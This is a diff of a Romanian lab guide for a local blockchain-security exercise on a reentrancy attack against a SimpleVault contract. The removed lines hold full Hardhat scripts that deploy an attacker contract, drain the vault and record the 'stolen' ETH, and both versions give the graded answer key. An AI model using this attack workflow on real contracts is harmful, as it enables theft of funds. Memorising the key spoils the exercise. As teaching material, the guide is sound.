@@ -246,12 +246,6 @@ npm run validate:results -- --challenge1
 
 ## Pasul 6: Rezolvare Challenge 2 (Reentrancy Attack)
 
-### 6.0 Deploy Challenge 2 (după Challenge 1)
-
-```bash
-npm run deploy:vault
-```
-
 ### 6.1 Verifică datele vault-ului
 
 ```bash
@@ -260,219 +254,57 @@ const d = require('./deployments/simple-vault.json');
 console.log('=== CHALLENGE 2 DATA ===');
 console.log('vault address:', d.contractAddress);
 console.log('total balance:', d.totalBalance, 'ETH');
-console.log('suggested deposit:', d.attackHints.suggestedDepositEth, 'ETH');
-console.log('suggested max attacks:', d.attackHints.suggestedMaxAttacks);
 d.deposits.forEach(dep => {
   console.log('  depositor [' + dep.signerIndex + ']:', dep.address, '->', dep.amount, 'ETH');
 });
 "
 ```
 
-### 6.2 Analizează contractul vulnerabil
+### 6.2 Răspunsuri Q1-Q2 (analiză cod)
 
-Răspunsurile Q1-Q5 vin din citirea codului `contracts/SimpleVault.sol`:
+Vin din citirea `contracts/SimpleVault.sol`:
+
+- **Q1**: `reentrancy` (tipul vulnerabilității)
+- **Q2**: `checks-effects-interactions` (pattern-ul de remediere)
+
+### 6.3 Rulare atac (Q3-Q6)
+
+```bash
+npm run attack
+```
+
+**Output așteptat**: vault-ul golit, valorile Q3-Q6 afișate + salvate în `deployments/attack-results.json`.
+
+### 6.4 Generare JSON Challenge 2
 
 ```bash
 node -e "
-console.log('=== ANALIZA SIMPLEVAULT ===');
-console.log('');
-console.log('Q1 - Funcția vulnerabilă principală:');
-console.log('  withdraw');
-console.log('');
-console.log('Q2 - A doua funcție vulnerabilă:');
-console.log('  withdrawAll');
-console.log('');
-console.log('Q3 - Linia de external call din withdraw():');
-console.log('  (bool success, ) = msg.sender.call{value: _amount}(\"\");');
-console.log('');
-console.log('Q4 - Liniile de state update DUPĂ external call:');
-console.log('  balances[msg.sender] -= _amount;');
-console.log('  totalDeposits -= _amount;');
-console.log('');
-console.log('Q5 - Pattern vulnerabilitate: reentrancy');
-console.log('Q10 - Pattern remediere: checks-effects-interactions');
-"
-```
+const fs = require('fs');
+const instance = require('./student/instance.json');
+const attack = require('./deployments/attack-results.json');
 
-### 6.3 Compilare (dacă nu s-a făcut deja)
-
-```bash
-npx hardhat compile
-```
-
-### 6.4 Rulare atac și generare răspunsuri Challenge 2
-
-Acest script face deploy la atacator, execută atacul, și generează JSON-ul de rezultate:
-
-```bash
-npx hardhat console --network localhost <<'SCRIPT'
-const vaultData = require("./deployments/simple-vault.json");
-const instance = require("./student/instance.json");
-
-const vaultAddr = vaultData.contractAddress;
-console.log("Vault address:", vaultAddr);
-
-// Obține vault-ul
-const SimpleVault = await ethers.getContractFactory("SimpleVault");
-const vault = SimpleVault.attach(vaultAddr);
-
-const balBefore = await ethers.provider.getBalance(vaultAddr);
-console.log("Vault balance BEFORE:", ethers.utils.formatEther(balBefore), "ETH");
-
-// Deploy attacker
-const VaultAttacker = await ethers.getContractFactory("VaultAttacker");
-const attacker = await VaultAttacker.deploy(vaultAddr);
-await attacker.deployed();
-console.log("Attacker deployed at:", attacker.address);
-
-// Setează max attacks din instance hints
-const maxAtk = vaultData.attackHints.suggestedMaxAttacks || 5;
-await attacker.setMaxAttacks(maxAtk);
-console.log("Max attacks set to:", maxAtk);
-
-// Deposit
-const depositEth = vaultData.attackHints.suggestedDepositEth || "1.0";
-const depositTx = await attacker.depositToVault({ value: ethers.utils.parseEther(depositEth) });
-await depositTx.wait();
-console.log("Deposited", depositEth, "ETH into vault via attacker");
-
-// Attack
-const attackTx = await attacker.attack();
-await attackTx.wait();
-console.log("Attack executed!");
-
-const balAfter = await ethers.provider.getBalance(vaultAddr);
-console.log("Vault balance AFTER:", ethers.utils.formatEther(balAfter), "ETH");
-
-const stolen = await attacker.getStolenAmount();
-console.log("Stolen amount:", ethers.utils.formatEther(stolen), "ETH");
-
-// Formatare 4 zecimale
-function fmt4(wei) {
-  const raw = parseFloat(ethers.utils.formatEther(wei));
-  return raw.toFixed(4);
-}
-
-// Generare JSON
 const result = {
-  challenge: "challenge2-reentrancy",
+  challenge: 'challenge2-reentrancy',
   studentId: instance.studentId,
   instanceId: instance.instanceId,
   answers: {
-    q1VulnerableFunction: "withdraw",
-    q2SecondVulnerableFunction: "withdrawAll",
-    q3ExternalCallLine: '(bool success, ) = msg.sender.call{value: _amount}("");',
-    q4PostCallStateUpdates: [
-      "balances[msg.sender] -= _amount;",
-      "totalDeposits -= _amount;"
-    ],
-    q5VulnerabilityPattern: "reentrancy",
-    q6VaultAddress: vaultAddr,
-    q7InitialVaultBalanceEth: fmt4(balBefore),
-    q8AttackerContractAddress: attacker.address,
-    q9FinalVaultBalanceEth: fmt4(balAfter),
-    q10RemediationPattern: "checks-effects-interactions"
+    q1VulnerabilityPattern: 'reentrancy',
+    q2RemediationPattern: 'checks-effects-interactions',
+    q3VaultAddress: attack.vaultAddress,
+    q4InitialVaultBalanceEth: attack.initialVaultBalanceEth,
+    q5AttackerContractAddress: attack.attackerAddress,
+    q6FinalVaultBalanceEth: attack.finalVaultBalanceEth
   }
 };
 
-const fs = require("fs");
-fs.mkdirSync("student/submissions", { recursive: true });
-fs.writeFileSync("student/submissions/challenge2-results.json", JSON.stringify(result, null, 2) + "\n");
-console.log("\nchallenge2-results.json generat!");
+fs.mkdirSync('student/submissions', { recursive: true });
+fs.writeFileSync('student/submissions/challenge2-results.json', JSON.stringify(result, null, 2) + '\n');
+console.log('challenge2-results.json generat!');
 console.log(JSON.stringify(result, null, 2));
-SCRIPT
+"
 ```
 
-> **Notă**: `hardhat console` este interactiv. Comanda de mai sus folosește heredoc (`<<'SCRIPT'`). Dacă nu funcționează în terminalul tău, salvează conținutul într-un fișier temporar și rulează cu `npx hardhat run tmp-attack.js --network localhost`.
-
-### 6.5 Alternativă: script Hardhat standalone
-
-Dacă heredoc-ul nu merge, creează un fișier temporar:
-
-```bash
-cat > /tmp/run-attack.js <<'EOF'
-const fs = require("fs");
-const hre = require("hardhat");
-
-async function main() {
-  const vaultData = JSON.parse(fs.readFileSync("deployments/simple-vault.json", "utf8"));
-  const instance = JSON.parse(fs.readFileSync("student/instance.json", "utf8"));
-  const vaultAddr = vaultData.contractAddress;
-
-  const SimpleVault = await hre.ethers.getContractFactory("SimpleVault");
-  const vault = SimpleVault.attach(vaultAddr);
-
-  const balBefore = await hre.ethers.provider.getBalance(vaultAddr);
-  console.log("Vault balance BEFORE:", hre.ethers.utils.formatEther(balBefore), "ETH");
-
-  const VaultAttacker = await hre.ethers.getContractFactory("VaultAttacker");
-  const attacker = await VaultAttacker.deploy(vaultAddr);
-  await attacker.deployed();
-  console.log("Attacker deployed at:", attacker.address);
-
-  const maxAtk = vaultData.attackHints.suggestedMaxAttacks || 5;
-  await attacker.setMaxAttacks(maxAtk);
-
-  const depositEth = vaultData.attackHints.suggestedDepositEth || "1.0";
-  const depositTx = await attacker.depositToVault({
-    value: hre.ethers.utils.parseEther(depositEth)
-  });
-  await depositTx.wait();
-  console.log("Deposited", depositEth, "ETH");
-
-  const attackTx = await attacker.attack();
-  await attackTx.wait();
-  console.log("Attack executed!");
-
-  const balAfter = await hre.ethers.provider.getBalance(vaultAddr);
-  console.log("Vault balance AFTER:", hre.ethers.utils.formatEther(balAfter), "ETH");
-
-  const stolen = await attacker.getStolenAmount();
-  console.log("Stolen:", hre.ethers.utils.formatEther(stolen), "ETH");
-
-  function fmt4(wei) {
-    return parseFloat(hre.ethers.utils.formatEther(wei)).toFixed(4);
-  }
-
-  const result = {
-    challenge: "challenge2-reentrancy",
-    studentId: instance.studentId,
-    instanceId: instance.instanceId,
-    answers: {
-      q1VulnerableFunction: "withdraw",
-      q2SecondVulnerableFunction: "withdrawAll",
-      q3ExternalCallLine: '(bool success, ) = msg.sender.call{value: _amount}("");',
-      q4PostCallStateUpdates: [
-        "balances[msg.sender] -= _amount;",
-        "totalDeposits -= _amount;"
-      ],
-      q5VulnerabilityPattern: "reentrancy",
-      q6VaultAddress: vaultAddr,
-      q7InitialVaultBalanceEth: fmt4(balBefore),
-      q8AttackerContractAddress: attacker.address,
-      q9FinalVaultBalanceEth: fmt4(balAfter),
-      q10RemediationPattern: "checks-effects-interactions"
-    }
-  };
-
-  fs.mkdirSync("student/submissions", { recursive: true });
-  fs.writeFileSync(
-    "student/submissions/challenge2-results.json",
-    JSON.stringify(result, null, 2) + "\n"
-  );
-  console.log("\nchallenge2-results.json generat!");
-  console.log(JSON.stringify(result, null, 2));
-}
-
-main()
-  .then(() => process.exit(0))
-  .catch((e) => { console.error(e); process.exit(1); });
-EOF
-
-npx hardhat run /tmp/run-attack.js --network localhost
-```
-
-### 6.6 Validare format Challenge 2
+### 6.5 Validare format Challenge 2
 
 ```bash
 npm run validate:results -- --challenge2
@@ -508,9 +340,6 @@ echo ""
 echo "2. Challenge 2 results:"
 cat student/submissions/challenge2-results.json | head -5
 echo "   ..."
-echo ""
-echo "3. Attacker contract:"
-ls -la contracts/MyVaultAttacker.sol 2>/dev/null || echo "   (Nu există încă - studenții îl creează ei)"
 ```
 
 ---
@@ -545,11 +374,11 @@ Apoi reîncepe de la **Pasul 1**.
 | Compile | `npx hardhat compile` | `Compiled N Solidity files` |
 | Init student | `npm run init:student -- --student-id X --force` | `Instance generated successfully` |
 | Start Ganache | `LAB_GANACHE_MODE=cli ./start-ganache.sh` | Port 7545 activ |
-| Deploy C1 | `npm run deploy:challenge1` | `challenge1-data.json` creat |
-| Deploy C2 | `npm run deploy:vault` | `simple-vault.json` creat |
+| Deploy all | `npm run deploy:all` | `challenge1-data.json` + `simple-vault.json` create |
 | Verify setup | `npm run verify-setup` | `Setup verification PASSED!` |
 | Inspect tx | `npm run inspect:tx -- <hash> --show-input` | Afișează input + ASCII |
 | Trace funds | `npm run trace:funds -- <hash> 100` | Listează toate hop-urile |
+| Run attack | `npm run attack` | Vault golit, valorile Q6-Q9 afișate |
 | Validate C1 | `npm run validate:results -- --challenge1` | `[OK] Challenge 1` |
 | Validate C2 | `npm run validate:results -- --challenge2` | `[OK] Challenge 2` |
 | Validate all | `npm run validate:results` | `Submission format validation passed` |
